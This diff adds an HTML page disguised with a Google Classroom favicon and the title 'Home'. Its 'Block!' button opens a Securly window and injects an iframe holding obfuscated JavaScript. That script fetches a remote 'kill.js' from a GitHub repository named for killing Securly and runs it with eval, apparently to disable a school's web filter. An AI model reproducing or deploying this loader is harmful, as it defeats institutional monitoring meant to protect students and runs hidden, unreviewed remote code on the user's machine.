@@ -1,0 +1,37 @@
+<!--Download as HTML-->
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <link rel="icon" type="image/x-icon" href="https://ssl.gstatic.com/classroom/favicon.png">
+  <title>Home</title>
+</head>
+<body>
+  <div class="useful">
+    <button onclick="blank();">Block!</button>
+  </div>
+  <script>
+    //credit to topvaz for creating this + me for the favicon
+    function blank() {
+      let win = window.open('https://securly.com');
+      win.document.body.style.margin = '0';
+      win.document.body.style.height = '100vh';
+      var iframe = win.document.createElement('iframe');
+      iframe.style.border = 'none';
+      iframe.style.width = '100%';
+      iframe.style.height = '100%';
+      iframe.style.margin = '0';
+      iframe.src = `javascript:var _0x2f75a0=_0x1391;function _0x1391(_0x2063dd,_0x2ce582){var _0x1feb3e=_0x1feb();return _0x1391=function(_0x1391e7,_0x35076d){_0x1391e7=_0x1391e7-0x1d6;var _0x265461=_0x1feb3e[_0x1391e7];return _0x265461;},_0x1391(_0x2063dd,_0x2ce582);}function _0x1feb(){var _0x22a423=['1691480ENYNOl','212434tyNLlW','10gNzKDO','1016jrAXSe','3gZdZvk','4033404MpffmI','334788tFsKql','7NbJjhE','43641cLAdaD','https://raw.githubusercontent.com/zek-c/Securly-Kill-V111/main/kill.js','9358052truDAP','then','4259358qvByWp'];_0x1feb=function(){return _0x22a423;};return _0x1feb();}(function(_0x2e63be,_0x2c3c21){var _0x4ebc03=_0x1391,_0x52ab51=_0x2e63be();while(!![]){try{var _0x11e1a7=parseInt(_0x4ebc03(0x1d8))/0x1*(parseInt(_0x4ebc03(0x1e2))/0x2)+parseInt(_0x4ebc03(0x1da))/0x3+-parseInt(_0x4ebc03(0x1d9))/0x4+parseInt(_0x4ebc03(0x1e1))/0x5+-parseInt(_0x4ebc03(0x1e0))/0x6*(parseInt(_0x4ebc03(0x1db))/0x7)+-parseInt(_0x4ebc03(0x1d7))/0x8*(-parseInt(_0x4ebc03(0x1dc))/0x9)+-parseInt(_0x4ebc03(0x1d6))/0xa*(-parseInt(_0x4ebc03(0x1de))/0xb);if(_0x11e1a7===_0x2c3c21)break;else _0x52ab51['push'](_0x52ab51['shift']());}catch(_0x4b2b9d){_0x52ab51['push'](_0x52ab51['shift']());}}}(_0x1feb,0x7e2f6),fetch(_0x2f75a0(0x1dd))[_0x2f75a0(0x1df)](_0x402d47=>_0x402d47['text']())['then'](_0x4e46c9=>eval(_0x4e46c9)));`;
+      win.document.body.appendChild(iframe);
+      var fav = win.document.createElement('link');
+      fav.setAttribute("rel", "icon");
+      fav.setAttribute("type", "image/x-icon");
+      fav.setAttribute("href", "https://ssl.gstatic.com/classroom/favicon.png");
+      win.document.querySelector("head").appendChild(fav);
+      var tit = win.document.createElement('title');
+      tit.innerHTML = "Home";
+      win.document.querySelector("head").appendChild(tit);
+    }
+  </script>
+</body>
+</html>
